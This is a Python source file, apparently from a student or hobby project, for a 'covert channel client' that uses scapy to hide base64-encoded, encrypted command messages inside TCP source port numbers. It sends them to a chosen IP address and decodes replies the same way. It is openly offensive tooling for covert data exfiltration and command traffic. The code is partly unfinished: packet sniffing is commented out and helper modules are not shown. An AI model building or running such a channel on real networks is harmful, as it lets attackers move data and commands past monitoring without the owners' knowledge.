import logging
import string
import base64
# don't output warnings from scapy, kthx
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from manipulate_packets import *
from encryption import *
from random import randint
import msgdef_pb2 as msg
import argparse
import time
import binascii
# globals
global maxPort
global lastPosition
global fileSize
global args
maxPort = 65535
asciiMax = 127
lastPosition = 0
fileSize = 0
# start of execution

message = ""
length = 0
response = msg.Message()

def sendCommand(clientIp):
  print("Inside sendCommand")
  global args
  # Send commands to the client
  message = msg.Message()
  message.command.encrypt = encryptMessage(args.path)
  message.command.hash = msgHash(message.command.encrypt)
  message_string = message.SerializeToString()
  message_string = base64.b64encode(message_string)
  print("Sending following command: ", message_string.decode())
  # 1st
  fileSize = len(message_string)
  sendPackets(str(fileSize)+"\n", clientIp)
  sendPackets(message_string.decode(),clientIp)

def parsePacket(packet):
  print(1)
  global message
  global length
  global response
  sport = packet.sport
  difference = maxPort - sport
  binVal = bin(difference)[2:]
  binLen = len(binVal)
  print(packet["TCP"].flags)
  if packet["TCP"].flags == 0x40:
    if binLen > 8:
      # binary string contains two ascii characters
      # the last 8 characters in the string are always the 2nd character
      binChar2 = binVal[-8:]
      # python trims leading zeroes at the start of our concatenated binary string
      binChar1 = binVal[0:binLen - 8]
      char1 = chr(int(binChar1, 2))
      char2 = chr(int(binChar2, 2))
      if (char1.strip() != "" or char2.strip() != "") and (char1 in string.printable and char2 in string.printable):
        message += char1
        message += char2
      print("Received: " + char1 + char2)

    else:
      # binary string contains one ascii character
      char = chr(int(binVal, 2))
      if char.strip() != "" and char in string.printable:
        message += char
      print("Received: " + char)

    if message[-1]=="\n":
      length = int(message[:-1])
      message = ""
      print(length)
      
    if length == len(message):
      decodedMessage = base64.b64decode(message)
      response.ParseFromString(decodedMessage)
      field = response.WhichOneof('m')
      if field == "command":
        if response.hash == msgHash(response.encrypt):
          decryptMessage(response.encrypt)
        length = 0
        message = ""
      else:
        print("Hello Received!! Sending the command.\n")
        sendCommand(packet["IP"].src)


if __name__=="__main__":

  # Parse the arguments passed to the server
  parser = argparse.ArgumentParser(description='Covert Channel Client')
  parser.add_argument('-f'
                    , '--file'
                    , dest='path'
                    , help='absolute path to file to watch.'
                    , required=True)
  parser.add_argument('-d'
                    , '--destination'
                    , dest='destIp'
                    , help='IP address to covertly send data too.'
                    , required=True)
  """parser.add_argument('-p'
                    , '--pass'
                    , dest='pword'
                    , help='Password for encryption'
                    , required=True)
  parser.add_argument('-i'
                    , '--iv'
                    , dest='iv'
                    , help='IV for the encryption.'
                    , required=True)"""
  parser.add_argument('-t'
                    , '--time'
                    , dest='sendInterval'
                    , help='Max interval to wait between sends, in seconds.'
                    , required=True)
  args = parser.parse_args()
  # # 2nd
  # print(message_string)
  # fileSize = len(message_string)
  # print(fileSize)
  # sendPackets(str(fileSize)+"\n")
  # lastPosition = 0
  # sendPackets(message_string.decode())
  # lastPosition = 0
  sendCommand(args.destIp)
  # sniff for tcp packets with a destination port of 80, send them to parsePacket
  #sniff(filter="tcp and (dst port 80)", prn=parsePacket)